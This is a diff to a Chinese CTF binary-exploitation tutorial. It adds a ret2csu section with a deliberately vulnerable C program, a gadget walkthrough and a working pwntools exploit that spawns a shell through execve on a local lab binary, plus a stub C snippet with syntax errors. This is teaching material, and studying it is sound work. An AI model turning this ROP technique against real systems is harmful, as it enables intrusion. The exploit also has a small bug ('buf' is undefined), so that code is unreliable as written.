@@ -67,7 +67,7 @@ Table of Contents
 * [原理篇](#原理篇)
   * [ret2text](#ret2text)
     * [介绍](#介绍-4)
-    * [ret2text](#ret2text-1)
+    * [ret2text attack](#ret2text-attack)
       * [Exploit](#exploit)
     * [技巧](#技巧)
     * [实战](#实战)
@@ -76,7 +76,7 @@ Table of Contents
     * [介绍](#介绍-5)
     * [系统调用](#系统调用)
     * [execve](#execve)
-    * [ret2syscall](#ret2syscall-1)
+    * [ret2syscall attack](#ret2syscall-attack)
       * [Exploit](#exploit-1)
     * [实战](#实战-1)
     * [参考](#参考-4)
@@ -84,7 +84,7 @@ Table of Contents
     * [介绍](#介绍-6)
     * [shellcode](#shellcode)
     * [EIP/RIP控制](#eiprip控制)
-    * [ret2shellcode](#ret2shellcode-1)
+    * [ret2shellcode attack](#ret2shellcode-attack)
       * [Exploit](#exploit-2)
     * [实战](#实战-2)
     * [参考](#参考-5)
@@ -176,19 +176,26 @@ Table of Contents
     * [实战](#实战-11)
     * [参考](#参考-14)
   * [x86绕过ecx](#x86绕过ecx)
+  * [ret2csu](#ret2csu)
+    * [介绍](#介绍-16)
+    * [ret2csu attack](#ret2csu-attack)
+      * [Exploit](#exploit-14)
+    * [实战](#实战-12)
+    * [参考](#参考-15)
+  * [srop](#srop)
   * [dynelf](#dynelf)
   * [one\_gadget use](#one_gadget-use)
-    * [介绍](#介绍-16)
-    * [one\_gadget](#one_gadget)
-    * [参考](#参考-15)
-  * [stack migrate](#stack-migrate)
     * [介绍](#介绍-17)
+    * [one\_gadget](#one_gadget)
+    * [参考](#参考-16)
+  * [stack migrate](#stack-migrate)
+    * [介绍](#介绍-18)
     * [leave指令](#leave指令)
     * [栈迁移](#栈迁移)
-      * [Exploit](#exploit-14)
+      * [Exploit](#exploit-15)
     * [栈劫持](#栈劫持)
-    * [实战](#实战-12)
-    * [参考](#参考-16)
+    * [实战](#实战-13)
+    * [参考](#参考-17)
   * [vsyscall trick](#vsyscall-trick)
   * [chunk extend and overlapping](#chunk-extend-and-overlapping)
   * [unlink](#unlink)
@@ -203,26 +210,26 @@ Table of Contents
   * [realloc trick](#realloc-trick)
   * [setcontext trick](#setcontext-trick)
   * [fix the symbol table](#fix-the-symbol-table)
-    * [介绍](#介绍-18)
+    * [介绍](#介绍-19)
     * [符号表](#符号表)
     * [剥离符号表](#剥离符号表)
     * [恢复符号表](#恢复符号表)
-    * [参考](#参考-17)
+    * [参考](#参考-18)
 * [工具篇](#工具篇)
   * [ROPgadget](#ropgadget-1)
-    * [介绍](#介绍-19)
+    * [介绍](#介绍-20)
     * [安装](#安装-1)
     * [使用](#使用)
   * [Ropper](#ropper-1)
-    * [介绍](#介绍-20)
+    * [介绍](#介绍-21)
     * [安装](#安装-2)
     * [使用](#使用-1)
   * [one\_gadget](#one_gadget-1)
-    * [介绍](#介绍-21)
+    * [介绍](#介绍-22)
     * [安装](#安装-3)
     * [使用](#使用-2)
   * [seccomp\-tools](#seccomp-tools)
-    * [介绍](#介绍-22)
+    * [介绍](#介绍-23)
     * [安装](#安装-4)
     * [使用](#使用-3)
   * [LibcSearcher](#libcsearcher)
@@ -234,24 +241,25 @@ Table of Contents
   * [pwnable\.tw](#pwnabletw)
     * [start](#start)
       * [分析](#分析-1)
-      * [Exploit](#exploit-15)
+      * [Exploit](#exploit-16)
     * [orw](#orw)
       * [分析](#分析-2)
-      * [Exploit](#exploit-16)
+      * [Exploit](#exploit-17)
     * [CVE\-2018\-1160](#cve-2018-1160)
-      * [参考](#参考-18)
+      * [参考](#参考-19)
     * [calc](#calc)
       * [分析](#分析-3)
     * [dubblesort](#dubblesort)
   * [2021 蓝帽杯](#2021-蓝帽杯)
     * [slient](#slient)
       * [分析](#分析-4)
-      * [Exploit](#exploit-17)
+      * [Exploit](#exploit-18)
   * [2021 长城杯](#2021-长城杯)
     * [K1ng\_in\_h3Ap\_I](#k1ng_in_h3ap_i)
       * [分析](#分析-5)
 * [研究篇](#研究篇)
   * [format string vuln attack \.got](#format-string-vuln-attack-got)
+  * [ret2csu \+ \.got](#ret2csu--got)
 * [附录](#附录)
   * [ascii码表](#ascii码表)
 
@@ -1028,7 +1036,7 @@ ret2text是ROP系列中最简单的一类题型, 它的一个本质就是控制�
 2. 寻找程序内可利用的代码片段
 3. 通过溢出控制程序流去执行可利用片段
 
-### ret2text
+### ret2text attack
 
 熟悉这一题型最好的方法就是通过实例来讲解, 这里以一个x64的题目来分析
 
@@ -1236,7 +1244,7 @@ int main() {
 
 参考: https://baike.baidu.com/item/execve/4475693?fr=aladdin
 
-### ret2syscall
+### ret2syscall attack
 
 ```c
 #include<stdio.h>
@@ -1419,7 +1427,7 @@ shellc = asm(shellc)
 
 shellcode地址不一定是必须要固定地址, 需要调试来看, 灵活应变
 
-### ret2shellcode
+### ret2shellcode attack
 
 ```c
 #include<stdio.h>
@@ -3967,6 +3975,147 @@ gdb调试来看一下, 在scanf处设下断点
 
 
 
+## ret2csu
+
+### 介绍
+
+在x64程序里参数都是通过寄存器来传递, 但是有时候会找不全寄存器来保存我们要用的参数, 这时候利用__libc_csu_init中的代码片段即可解决这个问题
+
+### ret2csu attack
+
+基本上所有x64程序都还有__libc_csu_init代码片段, 它是在执行main函数之前被调用来初始化的, 随便看一个x64程序
+
+![image-20220413110712615](Self-help_Clown.assets/image-20220413110712615.png)
+
+这个就是ret2csu利用的主要代码, 先看loc_666处的代码片段是一长串的pop指令, 将栈中数据都弹到寄存器中, 然后执行ret指令返回
+
+再来看loc_650, 将r15中的值复制给rdx, 将r14中的值复制给rsi, 将r13的值复制给rdi, 这三个复制指令将值都复制到了前三个参数寄存器, 然后call指令跳转去执行\[r12+rbx*8]内存储的地址的代码片段(可以理解为二重指针, 就是r12+rbx\*8指向一个地址, 这个地址内又保存了代码片段的地址, 也就是r12+rbx\*8 -> addr -> 代码片段地址), add指令将rbx加1, cmp对比rbp和rbx的值, 如果不相等则跳转, 相等则接着往下执行loc_666内容
+
+我们以一道题来讲一下具体如何用
+
+```c
+#include<stdio.h>
+#include<unistd.h>
+char sh[] = "/bin/sh";
+int main() {
+    char buf[0x10];
+    printf("buf: %p\n", buf);
+    printf("read: %p\n", &read);
+    fflush(0);
+    read(0, buf, 0x60);
+    return 0;
+}
+// gcc ret2csu.c -o ret2csu -fno-stack-protector -no-pie
+```
+
+这个题是ret2libc level3的题型, 为了方便我把buf地址和函数真实地址给直接leak出来了, 这样就可以专注于将ret2csu的操作了, 虽然这道题可以用system函数, 但是我们还是假设system函数不可用, 必须用execve函数
+
+execve需要三个寄存器, 所以要`pop rdi, pop rsi, pop rdx`将参数给传递给寄存器
+
+![image-20220413162140383](Self-help_Clown.assets/image-20220413162140383.png)
+
+但是只找到两个, rdx的找不到, 但是rdx不赋值为0的话, 可能会造成获取shell失败, 所以这里就需要用csu来完成传参, 我们把函数返回地址填为pop rbx处
+
+![image-20220413162631407](Self-help_Clown.assets/image-20220413162631407.png)
+
+具体给每个寄存器传参为
+
+```c
+rbx <- 0	绕过call指令的rbx*8和绕过cmp对比
+rbp <- 1	绕过cmp对比
+r12 <- addr	addr是保存着execve地址的栈帧的地址
+r13 <- "/bin/sh"	到时候会复制给第一个参数寄存器rdi
+r14 <- 0	到时候会复制给第二个参数寄存器rsi
+r15 <- 0	到时候会复制给第三个参数寄存器rdx
+```
+
+![image-20220413172622237](Self-help_Clown.assets/image-20220413172622237.png)
+
+这个就是溢出覆盖后的栈示意图, 我们结合汇编指令来讲解一下图
+
+首先是main函数ret返回去执行那一长串的pop指令
+
+```c
+.text:000000000040064A                 pop     rbx
+.text:000000000040064B                 pop     rbp
+.text:000000000040064C                 pop     r12
+.text:000000000040064E                 pop     r13
+.text:0000000000400650                 pop     r14
+.text:0000000000400652                 pop     r15
+```
+
+结果为
+
+![image-20220413172837394](Self-help_Clown.assets/image-20220413172837394.png)
+
+对应寄存器都存储了对应的值, 然后rsp指针指向了存储mov rdx, r15那条指令栈帧处, 然后ret指令, 就会跳转过去执行那三个mov指令
+
+```c
+.text:0000000000400630                 mov     rdx, r15
+.text:0000000000400633                 mov     rsi, r14
+.text:0000000000400636                 mov     edi, r13d
+```
+
+结果为
+
+![image-20220413173008193](Self-help_Clown.assets/image-20220413173008193.png)
+
+这样execve的参数就准备好了
+
+接下来就是call指令
+
+```c
+.text:0000000000400639                 call    ds:(__frame_dummy_init_array_entry - 600E08h)[r12+rbx*8]
+```
+
+这条指令就直接调用r12内存储buf地址指向的execve地址, 也就是调execve函数, 获取到shell
+
+#### Exploit
+
+```python
+from pwn import*
+o = process('./ret2csu')
+elf = ELF('./ret2csu')
+libc = elf.libc
+mov_rdx = 0x400630	# mov指令处
+pop6_rbx = 0x40064A	# pop一串指令处
+bin_sh = elf.search("/bin/sh").next()
+o.recvuntil("buf: ")
+buf_addr = int(o.recv(14), 16)	# 获取buf地址
+o.recvuntil("read: ")
+read_addr = int(o.recv(14), 16)	# 获取函数真实地址
+libc_base = read_addr - libc.sym['read']
+print hex(libc_base)
+execve = libc_base + libc.sym['execve']
+payload = p64(execve) + "a"*0x10	# 填充buf和rbp
+payload	+= p64(pop6_rbx)	# 填充函数返回地址为pop一串指令处
+payload += p64(0) + p64(1) + p64(buf) + p64(bin_sh) + p64(0) + p64(0)	# 要pop给寄存器的东西
+payload += p64(mov_rdx)	# pop一串指令的ret返回地址, 也就是弄好参数和call execve处
+o.sendline(payload)
+o.interactive()
+```
+
+![screenshots](Self-help_Clown.assets/screenshots-16498427422601.gif)
+
+gdb来看是否和预想的一样运行
+
+![screenshots](Self-help_Clown.assets/screenshots-16498429387083.gif)
+
+可以发现所有的和我们讲的都一样
+
+### 实战
+
+
+
+### 参考
+
+-   https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/medium-rop/#ret2csu
+-   https://www.cnblogs.com/dddddblog/p/ret2csu.html
+
+## srop
+
+
+
 ## dynelf
 
 
@@ -5104,6 +5253,23 @@ payload += p64(regcomp_got)
 o.sendline(payload)
 o.sendline('1234')
 o.interactive()
+```
+
+## ret2csu + .got
+
+```c
+#include<stdio.h>
+char sh = "/bin/sh";
+int main() {
+	char *argv[] = {"echo", "hello", 0};
+    char *envp[] = {0}
+    execve("/bin/echo", argv, envp);
+    char buf[0x10];
+    puts("input:");
+    read(0, buf, 0x60);
+    return 0;
+}
+// gcc ret2csu_got.c -o ret2csu_got -fno-stack-protector -no-pie
 ```
 
 
